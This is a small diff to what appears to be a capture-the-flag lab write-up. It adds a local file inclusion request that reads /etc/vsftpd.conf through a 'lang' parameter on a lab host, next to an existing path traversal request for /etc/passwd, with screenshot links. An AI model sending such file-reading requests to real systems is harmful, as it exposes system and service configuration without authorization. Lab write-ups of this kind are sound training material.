@@ -225,3 +225,7 @@ http://192.168.207.14/secret_information/?lang=../../../../../../../../etc/passw
 ```
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/6417837f-5013-4861-8de8-2bb744cf28ef)
 
+```
+http://192.168.207.14/secret_information/?lang=/etc/vsftpd.conf
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/b53194e4-b57b-47f4-a117-e3e3bebbe663)
